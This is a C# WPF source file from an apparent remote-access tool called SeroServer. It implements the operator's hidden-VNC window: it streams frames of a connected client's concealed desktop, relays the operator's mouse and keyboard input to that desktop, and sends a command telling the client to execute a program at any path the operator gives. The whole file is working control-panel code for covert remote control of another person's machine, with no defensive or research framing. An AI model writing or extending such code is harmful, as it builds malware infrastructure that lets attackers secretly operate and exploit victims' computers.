using System.IO;
using System.Windows;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class HvncWindow : Window
{
    private readonly TlsServer _server;
    private readonly string _clientId;
    private volatile bool _closed, _streaming;
    private int _frameCount;
    private DateTime _fpsTime = DateTime.UtcNow;

    // Canvas dimensions reported by last frame
    private int _remoteW = 1280;
    private int _remoteH = 720;

    public HvncWindow(TlsServer server, string clientId)
    {
        _server   = server;
        _clientId = clientId;
        InitializeComponent();

        TxtClientId.Text = $"[ {clientId} ]";

        SldQuality.ValueChanged += (_, e) => TxtQuality.Text = $"{(int)e.NewValue}";
        SldFps.ValueChanged     += (_, e) => TxtFpsVal.Text  = $"{(int)e.NewValue}";

        _server.HvncFrameReceived  += OnHvncFrame;
        _server.ClientDisconnected += OnClientDisconnected;
        Closed += (_, _) =>
        {
            _closed = true;
            _server.HvncFrameReceived  -= OnHvncFrame;
            _server.ClientDisconnected -= OnClientDisconnected;
            if (_streaming) SendStop();
        };

        Opacity = 0;
        Loaded += (_, _) => BeginAnimation(OpacityProperty,
            new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(180)));
    }

    // ── Fullscreen ────────────────────────────────────────────────────────────

    private void BtnFullscreen_Click(object s, RoutedEventArgs e)
    {
        if (WindowState == WindowState.Maximized)
        {
            WindowState = WindowState.Normal;
            RootBorder.CornerRadius = new CornerRadius(10);
            BtnFullscreen.Content = "⛶";
        }
        else
        {
            WindowState = WindowState.Maximized;
            RootBorder.CornerRadius = new CornerRadius(0);
            BtnFullscreen.Content = "❐";
        }
    }

    // ── Streaming state ───────────────────────────────────────────────────────

    private void SetStreamingState(bool streaming)
    {
        _streaming = streaming;
        Dispatcher.BeginInvoke(() =>
        {
            BtnStart.IsEnabled  = !streaming;
            BtnStart.Opacity    = streaming ? 0.35 : 1.0;
            BtnStop.IsEnabled   = streaming;
            BtnStop.Opacity     = streaming ? 1.0 : 0.35;
            SldQuality.IsEnabled = !streaming;
            SldFps.IsEnabled     = !streaming;
            TxtStatus.Text       = streaming ? "Streaming..." : "Stopped";
            LiveBadge.Visibility = streaming ? Visibility.Visible : Visibility.Collapsed;
            if (streaming)  TxtPlaceholder.Visibility = Visibility.Collapsed;
            if (!streaming) TxtFps.Text = "";
        });
    }

    // ── Outgoing ──────────────────────────────────────────────────────────────

    private void SendStart()
    {
        var data = new HvncStartData
        {
            Quality = (int)SldQuality.Value,
            Fps     = (int)SldFps.Value,
            Width   = 1280,
            Height  = 720
        };
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.HvncStart,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
        });
        SetStreamingState(true);
    }

    private void SendStop()
    {
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.HvncStop, Data = "{}" });
        SetStreamingState(false);
    }

    private void SendAck()
    {
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.HvncFrameAck });
    }

    private void SendInput(HvncInputData inp)
    {
        if (!_streaming) return;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.HvncInput,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(inp)
        });
    }

    // ── Incoming ──────────────────────────────────────────────────────────────

    private void OnHvncFrame(string clientId, string json)
    {
        if (_closed || clientId != _clientId) return;
        try
        {
            var frame = Newtonsoft.Json.JsonConvert.DeserializeObject<HvncFrameData>(json);
            if (frame == null || string.IsNullOrEmpty(frame.J)) { SendAck(); return; }

            _remoteW = frame.W > 0 ? frame.W : _remoteW;
            _remoteH = frame.H > 0 ? frame.H : _remoteH;

            Task.Run(() =>
            {
                try
                {
                    var bytes = Convert.FromBase64String(frame.J);
                    using var ms = new MemoryStream(bytes);
                    var bi = new BitmapImage();
                    bi.BeginInit();
                    bi.StreamSource = ms;
                    bi.CacheOption = BitmapCacheOption.OnLoad;
                    bi.EndInit();
                    bi.Freeze();
                    if (!_closed)
                        Dispatcher.BeginInvoke(() => ShowFrame(bi));
                }
                catch { SendAck(); }
            });
        }
        catch { SendAck(); }
    }

    private void ShowFrame(BitmapImage bi)
    {
        if (_closed) return;
        ImgFrame.Source = bi;
        TxtPlaceholder.Visibility = Visibility.Collapsed;

        _frameCount++;
        var now = DateTime.UtcNow;
        if ((now - _fpsTime).TotalSeconds >= 1)
        {
            TxtFps.Text = $"{_frameCount} fps";
            _frameCount = 0;
            _fpsTime = now;
        }
        SendAck();
    }

    // ── Input mapping ─────────────────────────────────────────────────────────

    private (int rx, int ry) ToRemote(Point local)
    {
        double sx = _remoteW / Math.Max(1, ImgFrame.ActualWidth);
        double sy = _remoteH / Math.Max(1, ImgFrame.ActualHeight);
        return ((int)(local.X * sx), (int)(local.Y * sy));
    }

    private void ImgFrame_MouseMove(object s, MouseEventArgs e)
    {
        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
        SendInput(new HvncInputData { T = "mm", X = rx, Y = ry });
    }

    private void ImgFrame_MouseDown(object s, MouseButtonEventArgs e)
    {
        ImgFrame.Focus();
        ImgFrame.CaptureMouse();
        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
        int btn = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
        SendInput(new HvncInputData { T = "mc", X = rx, Y = ry, Button = btn, Down = true });
        e.Handled = true;
    }

    private void ImgFrame_MouseUp(object s, MouseButtonEventArgs e)
    {
        ImgFrame.ReleaseMouseCapture();
        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
        int btn = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
        SendInput(new HvncInputData { T = "mc", X = rx, Y = ry, Button = btn, Down = false });
        e.Handled = true;
    }

    private void ImgFrame_MouseWheel(object s, MouseWheelEventArgs e)
    {
        var (rx, ry) = ToRemote(e.GetPosition(ImgFrame));
        SendInput(new HvncInputData { T = "mw", X = rx, Y = ry, WheelDelta = e.Delta });
    }

    private void ImgFrame_KeyDown(object s, KeyEventArgs e)
    {
        int vk = KeyInterop.VirtualKeyFromKey(e.Key);
        SendInput(new HvncInputData { T = "kd", VK = vk });
        e.Handled = true;
    }

    private void ImgFrame_KeyUp(object s, KeyEventArgs e)
    {
        int vk = KeyInterop.VirtualKeyFromKey(e.Key);
        SendInput(new HvncInputData { T = "ku", VK = vk });
        e.Handled = true;
    }

    // ── UI handlers ───────────────────────────────────────────────────────────

    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(Close);
    }

    private void BtnStart_Click(object s, RoutedEventArgs e) => SendStart();
    private void BtnStop_Click(object s, RoutedEventArgs e)  => SendStop();
    private void Close_Click(object s, RoutedEventArgs e)    => Close();
    private void TitleBar_Drag(object s, MouseButtonEventArgs e) => DragMove();

    private void BtnExec_Click(object s, RoutedEventArgs e)
    {
        var path = TxtExecPath.Text.Trim();
        if (string.IsNullOrEmpty(path)) return;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.HvncExec,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new HvncExecData { Path = path })
        });
    }

    private void ResizeGrip_DragDelta(object s, DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }
}
